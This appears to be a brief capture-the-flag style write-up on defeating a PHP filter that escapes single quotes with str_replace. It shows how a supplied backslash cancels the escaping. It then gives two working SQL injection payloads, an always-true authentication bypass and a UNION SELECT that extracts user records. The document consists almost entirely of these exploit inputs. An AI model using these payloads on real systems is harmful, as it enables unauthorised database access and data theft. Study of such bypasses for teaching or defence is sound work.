# Hint
```php
str_replace("'", "\\'", $str);
```

```
'   -> \'
\'  -> \\'
```

# Method 1
```
1\' OR blablabla = true #
SELECT * FROM `user` WHERE `1\\' OR blablabla = true # blablabla
```

# Method 2
```
1\' UNION SELECT 1, user, 1, trueorfalse FROM `user` #  
```
